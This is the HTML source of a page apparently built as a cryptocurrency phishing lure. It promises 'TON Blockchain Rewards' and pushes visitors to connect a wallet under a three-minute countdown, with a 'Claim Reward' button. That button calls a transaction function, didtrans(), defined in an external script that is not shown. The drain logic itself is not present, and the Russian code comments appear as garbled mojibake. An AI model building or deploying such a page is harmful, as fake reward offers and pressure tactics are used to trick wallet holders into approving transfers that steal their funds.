<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Blockchain Rewards</title>
    
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
    
    <style>
        /* –û–±—â–∏–µ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ */
        body {
            background: linear-gradient(135deg, #001f3d, #0057b7);
            color: white;
            font-family: Arial, sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: space-evenly; /* –£–±–∏—Ä–∞–µ–º –ø–µ—Ä–µ–∫—Ä—ã—Ç–∏–µ —ç–ª–µ–º–µ–Ω—Ç–æ–≤ */
            height: 100vh; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—ã—Å–æ—Ç—É —ç–∫—Ä–∞–Ω–∞ */
            margin: 0;
            padding: 10px;
            box-sizing: border-box;
            overflow: hidden; /* –û—Ç–∫–ª—é—á–∞–µ–º –ø—Ä–æ–∫—Ä—É—Ç–∫—É –ø–æ –≤—ã—Å–æ—Ç–µ */
        }

        /* –ù–∞—Å—Ç—Ä–æ–π–∫–∏ –∑–∞–≥–æ–ª–æ–≤–∫–∞ */
        #title {
            font-size: 8vw; /* –î–µ–ª–∞–µ–º —Ä–∞–∑–º–µ—Ä —à—Ä–∏—Ñ—Ç–∞ –≥–∏–±–∫–∏–º */
            font-weight: bold;
            color: #00aaff;
            text-shadow: 0 0 10px #00aaff;
            margin-bottom: 5px;
        }

        /* –õ–æ–≥–æ—Ç–∏–ø */
        #ton-logo-large {
            width: 18vw; /* –î–µ–ª–∞–µ–º –ª–æ–≥–æ—Ç–∏–ø –≥–∏–±–∫–∏–º */
            height: auto;
            margin-bottom: 10px;
        }

        /* –ü–æ–¥–∑–∞–≥–æ–ª–æ–≤–æ–∫ */
        #subtitle {
            font-size: 5vw; /* –†–∞–∑–º–µ—Ä —à—Ä–∏—Ñ—Ç–∞ –∑–∞–≤–∏—Å–∏—Ç –æ—Ç —à–∏—Ä–∏–Ω—ã —ç–∫—Ä–∞–Ω–∞ */
            color: #b0c4de;
            margin-bottom: 15px;
        }

        /* –û—Å–Ω–æ–≤–Ω–æ–π –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä */
        main {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 10px;
            flex-grow: 1;
            overflow-y: auto; /* –î–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–∫—Ä—É—Ç–∫—É –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ–≥–æ –∫–æ–Ω—Ç–µ–Ω—Ç–∞ */
        }

        /* –ö–Ω–æ–ø–∫–∞ */
        button {
            background: linear-gradient(90deg, #0088cc, #00aaff);
            color: white;
            font-size: 5vw; /* –†–∞–∑–º–µ—Ä —à—Ä–∏—Ñ—Ç–∞ –¥–ª—è –∫–Ω–æ–ø–∫–∏ */
            padding: 3vw 6vw;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: 0.3s;
            box-shadow: 0 0 10px #00aaff;
            margin-bottom: 10px;
        }

        button:hover {
            background: linear-gradient(90deg, #0066aa, #0099dd);
            box-shadow: 0 0 20px #00aaff;
        }

        /* –õ–æ–≥–æ—Ç–∏–ø—ã –≤–Ω–∏–∑—É */
        #logos {
            display: flex;
            gap: 5vw;
            justify-content: center;
            margin-top: 10px;
        }

        .logo {
            width: 12vw; /* –°–¥–µ–ª–∞–µ–º –ª–æ–≥–æ—Ç–∏–ø—ã –±–æ–ª–µ–µ –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–º–∏ */
            height: auto;
        }

        /* –î–∏–Ω–∞–º–∏—á–Ω—ã–µ –ª–æ–≥–æ —Å –∞–Ω–∏–º–∞—Ü–∏–µ–π */
        .dynamic-logo {
            width: 15vw; /* –†–∞–∑–º–µ—Ä –¥–∏–Ω–∞–º–∏—á–Ω—ã—Ö –ª–æ–≥–æ—Ç–∏–ø–æ–≤ */
            height: auto;
            transition: transform 1s ease-in-out;
            animation: heartbeat 1.5s ease-in-out infinite;
        }

        @keyframes heartbeat {
            0%, 100% {
                transform: scale(1);
            }
            25% {
                transform: scale(1.2);
            }
            50% {
                transform: scale(1);
            }
            75% {
                transform: scale(1.2);
            }
        }

        /* –¢–∞–π–º–µ—Ä */
        #countdown {
            font-size: 6vw; /* –†–∞–∑–º–µ—Ä —à—Ä–∏—Ñ—Ç–∞ —Ç–∞–π–º–µ—Ä–∞ */
            font-weight: bold;
            color: #ff4444;
            margin-top: 10px;
        }

        /* –ë–ª–æ–∫ —Å –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–µ–π –æ –∫–æ—à–µ–ª—å–∫–µ */
        #wallet-info {
            font-size: 4.5vw;
            margin-bottom: 20px;
        }

        /* –ú–æ–±–∏–ª—å–Ω—ã–π –¥–∏–∑–∞–π–Ω: –∑–∞–ø—Ä–µ—Ç –Ω–∞ –ø—Ä–æ–∫—Ä—É—Ç–∫—É */
        @media (max-width: 768px) {
            main {
                gap: 10px;
                height: 100%; /* –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∫–æ–Ω—Ç–µ–π–Ω–µ—Ä –Ω–∞ –≤—Å—é –≤—ã—Å–æ—Ç—É */
                overflow-y: auto; /* –ï—Å–ª–∏ –Ω—É–∂–Ω–æ, –¥–æ–±–∞–≤–ª—è–µ–º –ø—Ä–æ–∫—Ä—É—Ç–∫—É –ø–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–º—É */
            }

            #subtitle {
                font-size: 5vw;
            }

            button {
                font-size: 5vw;
                padding: 4vw 8vw;
            }

            #countdown {
                font-size: 5vw;
            }

            #logos {
                gap: 5vw;
            }

            .logo {
                width: 12vw;
            }
        }
    </style>
</head>
<body>
    <div id="title">TON Blockchain Rewards</div>
    <img id="ton-logo-large" src="ton_logo.png" alt="TON Logo">

    <main>
        <div id="subtitle">Connect your wallet and claim your reward now!</div>

        <div id="wallet-info"></div> <!-- –ë–ª–æ–∫ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ -->

        <div id="dynamic-logos">
            <img class="dynamic-logo" src="notcoin_logo.png" alt="Notcoin">
            <img class="dynamic-logo" src="ton_logo.png" alt="TON">
            <img class="dynamic-logo" src="dog_logo.png" alt="TonDogs">
        </div>

        <div id="ton-connect"></div>
        <button onclick="didtrans();">üöÄ Claim Reward üöÄ</button>
        
        <div id="countdown"></div> <!-- –ü—Ä–æ—Å—Ç–æ —Å–∞–º —Ç–∞–π–º–µ—Ä -->

        <div id="logos">
            <img class="logo" src="telegram_logo.png" alt="Telegram">
            <img class="logo" src="ton_logo.png" alt="TON Blockchain">
            <img class="logo" src="blockchain_logo.png" alt="Blockchain">
        </div>
    </main>
    <footer>
        ¬© 2025 TON Blockchain Rewards | All rights reserved
    </footer>
    <!-- Heartbeat Sound -->
    <audio id="heartbeat-sound" src="heartbeat_sound.mp3" loop></audio>

    <script src="tonsdk.js"></script>
    
    <script>
        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è —Ç–∞–π–º–µ—Ä–∞
        function startCountdown() {
            let timerElement = document.getElementById('countdown');
            let timeRemaining = 180; // 180 —Å–µ–∫—É–Ω–¥ (3 –º–∏–Ω—É—Ç—ã)

            // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ–±–Ω–æ–≤–ª–µ–Ω–∏—è –≤—Ä–µ–º–µ–Ω–∏ –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
            const countdownInterval = setInterval(function() {
                if (timeRemaining <= 0) {
                    clearInterval(countdownInterval); // –û—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ç–∞–π–º–µ—Ä, –∫–æ–≥–¥–∞ –≤—Ä–µ–º—è –∏—Å—Ç–µ—á–µ—Ç
                    timerElement.innerText = '0'; // –ö–æ–≥–¥–∞ –≤—Ä–µ–º—è –∑–∞–∫–æ–Ω—á–∏—Ç—Å—è, —Å—Ç–∞–≤–∏–º 0
                } else {
                    timerElement.innerText = timeRemaining; // –ü—Ä–æ—Å—Ç–æ –≤—ã–≤–æ–¥–∏–º –≤—Ä–µ–º—è
                    timeRemaining--;
                }
            }, 1000); // –û–±–Ω–æ–≤–ª—è–µ–º –∫–∞–∂–¥—É—é —Å–µ–∫—É–Ω–¥—É
        }

        // –ó–∞–ø—É—Å–∫ —Ç–∞–π–º–µ—Ä–∞ –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.onload = function() {
            startCountdown();
        };
    </script>
</body>  
</html>
